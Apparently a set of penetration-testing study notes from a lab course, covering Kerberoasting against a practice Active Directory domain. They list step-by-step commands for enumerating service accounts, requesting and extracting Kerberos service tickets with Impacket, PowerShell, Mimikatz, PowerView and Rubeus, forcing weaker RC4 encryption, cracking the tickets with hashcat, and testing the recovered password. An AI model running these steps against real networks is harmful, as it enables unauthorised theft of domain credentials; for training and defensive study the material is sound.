# Kerberoasting

## 1.Kerberoasting - from Linux

### Kerberoasting - Performing the Attack

> Depending on your position in a network, this attack can be performed in multiple ways:
>
> From a non-domain joined Linux host using valid domain user credentials.\
> From a domain-joined Linux host as root after retrieving the keytab file.\
> From a domain-joined Windows host authenticated as a domain user.\
> From a domain-joined Windows host with a shell in the context of a domain account.\
> As SYSTEM on a domain-joined Windows host.\
> From a non-domain joined Windows host using runas /netonly.\
> Several tools can be utilized to perform the attack:
>
> Impacket’s GetUserSPNs.py from a non-domain joined Linux host.\
> A combination of the built-in setspn.exe Windows binary, PowerShell, and Mimikatz.\
> From Windows, utilizing tools such as PowerView, Rubeus, and other PowerShell scripts.\
> Obtaining a TGS ticket via Kerberoasting does not guarantee you a set of valid credentials, and the ticket must still be cracked offline with a tool such as Hashcat to obtain the cleartext password. TGS tickets take longer to crack than other formats such as NTLM hashes, so often, unless a weak password is set, it can be difficult or impossible to obtain the cleartext using a standard cracking rig.

### Kerberoasting with GetUserSPNs.py

* <https://github.com/SecureAuthCorp/impacket>

```shell-session
 sudo python3 -m pip install .
```

```shell-session
GetUserSPNs.py -h
```

### **Listing SPN Accounts with GetUserSPNs.py**

```shell-session
GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend
```

### Requesting all TGS Tickets

```shell-session
 GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend -request 
```

### Requesting a Single TGS ticket

```shell-session
GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend -request-user sqldev
```

### Saving the TGS Ticket to an Output File

```shell-session
GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend -request-user sqldev -outputfile sqldev_tgs
```

### Cracking the Ticket Offline with Hashcat

```shell-session
hashcat -m 13100 sqldev_tgs /usr/share/wordlists/rockyou.txt
```

### Testing Authentication against a Domain Controller

```shell-session
sudo crackmapexec smb 172.16.5.5 -u sqldev -p database!
```

## 2.Kerberoasting - from Windows

## Kerberoasting - Semi Manual method

### Enumerating SPNs with setspn.exe

```cmd-session
C:\htb> setspn.exe -Q */*
```

### Targeting a Single User

```powershell-session
PS C:\htb> Add-Type -AssemblyName System.IdentityModel
PS C:\htb> New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "MSSQLSvc/DEV-PRE-SQL.inlanefreight.local:1433"
```

> Before moving on, let's break down the commands above to see what we are doing (which is essentially what is used by [Rubeus](https://posts.specterops.io/kerberoasting-revisited-d434351bd4d1) when using the default Kerberoasting method):
>
> * The [Add-Type](https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/add-type?view=powershell-7.2) cmdlet is used to add a .NET framework class to our PowerShell session, which can then be instantiated like any .NET framework object
> * The `-AssemblyName` parameter allows us to specify an assembly that contains types that we are interested in using
> * [System.IdentityModel](https://docs.microsoft.com/en-us/dotnet/api/system.identitymodel?view=netframework-4.8) is a namespace that contains different classes for building security token services
> * We'll then use the [New-Object](https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/new-object?view=powershell-7.2) cmdlet to create an instance of a .NET Framework object
> * We'll use the [System.IdentityModel.Tokens](https://docs.microsoft.com/en-us/dotnet/api/system.identitymodel.tokens?view=netframework-4.8) namespace with the [KerberosRequestorSecurityToken](https://docs.microsoft.com/en-us/dotnet/api/system.identitymodel.tokens.kerberosrequestorsecuritytoken?view=netframework-4.8) class to create a security token and pass the SPN name to the class to request a Kerberos TGS ticket for the target account in our current logon session
>
> We can also choose to retrieve all tickets using the same method, but this will also pull all computer accounts, so it is not optimal.

### Retrieving All Tickets Using setspn.exe

> request tickets for all accounts with SPNs set

```powershell-session
PS C:\htb> setspn.exe -T INLANEFREIGHT.LOCAL -Q */* | Select-String '^CN' -Context 0,1 | % { New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $_.Context.PostContext[0].Trim() }
```

## Extracting Tickets from Memory with Mimikatz

> If we do not specify the `base64 /out:true` command, Mimikatz will extract the tickets and write them to `.kirbi` files.

```cmd-session
Using 'mimikatz.log' for logfile : OK

mimikatz # base64 /out:true
isBase64InterceptInput  is false
isBase64InterceptOutput is true

mimikatz # kerberos::list /export
```

### Preparing the Base64 Blob for Cracking

> We can place the above single line of output into a file and convert it back to a `.kirbi` file using the `base64` utility

```shell-session
 echo "<base64 blob>" |  tr -d \\n 
```

### Placing the Output into a File as .kirbi

```shell-session
cat encoded_file | base64 -d > sqldev.kirbi
```

* Next, we can use [this](https://raw.githubusercontent.com/nidem/kerberoast/907bf234745fe907cf85f3fd916d1c14ab9d65c0/kirbi2john.py) version of the `kirbi2john.py` tool to extract the Kerberos ticket from the TGS file.

### Extracting the Kerberos Ticket using kirbi2john.py

```shell-session
python2.7 kirbi2john.py sqldev.kirbi
```

> This will create a file called `crack_file`. We then must modify the file a bit to be able to use Hashcat against the hash.

### Modifiying crack\_file for Hashcat

```shell-session
sed 's/\$krb5tgs\$\(.*\):\(.*\)/\$krb5tgs\$23\$\*\1\*\$\2/' crack_file > sqldev_tgs_hashcat
```

> Now we can check and confirm that we have a hash that can be fed to Hashcat

### Viewing the Prepared Hash

```shell-session
cat sqldev_tgs_hashcat 
```

### Cracking the Hash with Hashcat

```shell-session
hashcat -m 13100 sqldev_tgs_hashcat /usr/share/wordlists/rockyou.txt
```

> If we decide to skip the base64 output with Mimikatz and type `mimikatz # kerberos::list /export`, the .kirbi file (or files) will be written to disk. In this case, we can download the file(s) and run `kirbi2john.py` against them directly, skipping the base64 decoding step.

***

## Automated / Tool Based Route

### Using PowerView to Enumerate SPN Accounts

```powershell-session
PS C:\htb> Import-Module .\PowerView.ps1
PS C:\htb> Get-DomainUser * -spn | select samaccountname
```

> From here, we could target a specific user and retrieve the TGS ticket in Hashcat format.

### Using PowerView to Target a Specific User

```powershell-session
PS C:\htb> Get-DomainUser -Identity sqldev | Get-DomainSPNTicket -Format Hashcat
```

> Finally, we can export all tickets to a CSV file for offline processing.

### Exporting All Tickets to a CSV File

```powershell-session
PS C:\htb> Get-DomainUser * -SPN | Get-DomainSPNTicket -Format Hashcat | Export-Csv .\ilfreight_tgs.csv -NoTypeInformation
```

### Viewing the Contents of the .CSV File

```powershell-session
PS C:\htb> cat .\ilfreight_tgs.csv
```

> We can also use [Rubeus](https://github.com/GhostPack/Rubeus) from GhostPack to perform Kerberoasting even faster and easier. Rubeus provides us with a variety of options for performing Kerberoasting.

## Using Rubeus

```powershell-session
PS C:\htb> .\Rubeus.exe
```

**Using the /stats Flag**

```powershell-session
PS C:\htb> .\Rubeus.exe kerberoast /stats
```

> Let's use Rubeus to request tickets for accounts with the `admincount` attribute set to `1`. These would likely be high-value targets and worth our initial focus for offline cracking efforts with Hashcat. Be sure to specify the `/nowrap` flag so that the hash can be more easily copied down for offline cracking using Hashcat. Per the documentation, the ""/nowrap" flag prevents any base64 ticket blobs from being column wrapped for any function"; therefore, we won't have to worry about trimming white space or newlines before cracking with Hashcat.

**Using the /nowrap Flag**

```powershell-session
PS C:\htb> .\Rubeus.exe kerberoast /ldapfilter:'admincount=1' /nowrap
```

## A Note on Encryption Types

```powershell-session
PS C:\htb> .\Rubeus.exe kerberoast /user:testspn /nowrap
```

```powershell-session
PS C:\htb> Get-DomainUser testspn -Properties samaccountname,serviceprincipalname,msds-supportedencryptiontypes
```

### Cracking the Ticket with Hashcat & rockyou.txt

```shell-session
hashcat -m 13100 rc4_to_crack /usr/share/wordlists/rockyou.txt 
```

Let's assume that our client has set SPN accounts to support AES 128/256 encryption.

<figure><img src="https://27438919-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FXIPxco87mgI3Ma3yEBLL%2Fuploads%2FBJZO1qzWhVxMmqamtvjE%2Fimage.png?alt=media&amp;token=8845e9eb-f282-47aa-bd09-716722066de1" alt=""><figcaption></figcaption></figure>

> If we check this with PowerView, we'll see that the `msDS-SupportedEncryptionTypes attribute` is set to `24`, meaning that AES 128/256 encryption types are the only ones supported.

### **Checking Supported Encryption Types**

```powershell-session
PS C:\htb> Get-DomainUser testspn -Properties samaccountname,serviceprincipalname,msds-supportedencryptiontypes
```

> Requesting a new ticket with Rubeus will show us that the account name is using AES-256 (type 18) encryption

### Requesting a New Ticket

```powershell-session
PS C:\htb>  .\Rubeus.exe kerberoast /user:testspn /nowrap
```

### Running Hashcat & Checking the Status of the Cracking Job

```shell-session
hashcat -m 19700 aes_to_crack /usr/share/wordlists/rockyou.txt
```

> We can use Rubeus with the `/tgtdeleg` flag to specify that we want only RC4 encryption when requesting a new service ticket. The tool does this by specifying RC4 encryption as the only algorithm we support in the body of the TGS request. This may be a failsafe built-in to Active Directory for backward compatibility. By using this flag, we can request an RC4 (type 23) encrypted ticket that can be cracked much faster.

## Using the /tgtdeleg request RC4 encryption when requesting a new service ticket

```
.\Rubeus.exe Kerberoast /tgtdeleg /user:testspn /nowrap
```
